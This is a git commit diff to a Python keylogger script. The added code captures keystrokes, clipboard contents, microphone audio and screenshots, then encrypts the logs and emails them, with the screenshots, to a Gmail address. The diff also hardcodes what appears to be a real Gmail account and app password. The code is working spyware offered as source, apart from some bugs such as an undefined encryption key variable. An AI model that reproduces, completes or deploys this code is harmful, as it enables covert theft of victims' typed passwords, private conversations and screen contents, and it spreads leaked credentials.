f53ae82ba32ed7171638a317562bd85e1c21192b
Rohit Chavhan <137694757+rchavhan2004@users.noreply.github.com>
2025-01-05 23:46:25 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -16,8 +16,8 @@ from pynput.keyboard import Key, Listener
 import time
 import os
 
-from scipy.io.wavfile import write
 import sounddevice as sd
+from scipy.io.wavfile import write
 
 from cryptography.fernet import Fernet
 
@@ -30,15 +30,26 @@ from scipy.stats import false_discovery_control
 
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
+clipboard_information = "clipboard.txt"
+audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
 
-email_address = ("xyz@gmail.com")
-password = ("12345678")
+keys_information_e = "e_key_log.txt"
+system_information_e = "e_systeminfo.txt"
+clipboard_information_e = "e_clipboard.txt"
 
-toaddr = "abc@gmail.com"
+microphone_time = 10
+time_iteration = 15
+number_of_iterations_end = 3
+
+email_address = ("wonlypans@gmail.com")
+password = ("llry gujd xclh gamt")
+
+toaddr = "wonlypans@gmail.com"
 
 file_path = r"C:\Users\LENOVO\PycharmProjects\PythonProject\keylogger"
-
 extend = "\\"
+file_merge = file_path + extend
 
 def send_email(filename, attachment, toaddr):
     fromaddr = email_address
@@ -101,30 +112,106 @@ def computer_information():
 
 computer_information()
 
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write(pasted_data + '\n' + pasted_data)
+
+        except:
+            f.write("Clipboard could not be opened")
+
+copy_clipboard()
+
+def microphone():
+    fs = 44100
+    seconds = microphone_time
+
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()
+
+    write(file_path + extend + audio_information, fs, myrecording)
+
+microphone()
+
+def screenshot ():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+
+screenshot()
+
+number_of_iterations = 0
+currentTime = time.time()
+stoppingtime = time.time() + time_iteration
+
+while number_of_iterations < number_of_iterations_end:
+
+    count = 0
+    keys = []
+
+    def on_press(key):
+        global keys, count, currentTime
+
+        print (key)
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+
+    def write_file(keys, key_information=None):
+        with open(file_path + extend + key_information, "a") as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write(k + "\n")
+                    f.close()
+                elif k.find("key") == -1:
+                    f.write(k + "\n")
+                    f.close()
+
+    def on_release(key):
+        if key == Key.esc:
+            return False
+        if currentTime > stoppingtime:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    if currentTime > stoppingtime:
+
+        with open(file_path + extend + keys_information, "w") as f:
+            f.write(" ")
+
+        screenshot()
+        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+
+        copy_clipboard()
+
+        number_of_iterations += 1
+
+        currentTime = time.time()
+        stoppingtime = time.time() + time_iteration
+
+files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
+encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
+
 count = 0
-keys = []
 
-def on_press(key):
-    global keys, count
+for encypting_files in files_to_encrypt:
 
-    print (key)
-    keys.append(key)
-    count += 1
+    with open(files_to_encrypt[count], "rb") as f:
+        data = f.read()
 
-def write_file(keys, key_information=None):
-    with open(file_path + extend + key_information, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write(k + "\n")
-                f.close()
-            elif k.find("key") == -1:
-                f.write(k + "\n")
-                f.close()
+    fernet=Fernet(ket)
+    encrypted = fernet.encrypt(data)
 
-def on_release(key):
-    if key == Key.esc:
-        return False
+    with open(encrypted_file_names[count], "wb") as f:
+        f.write(encrypted)
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+    count +=1
+
+time.sleep(120)
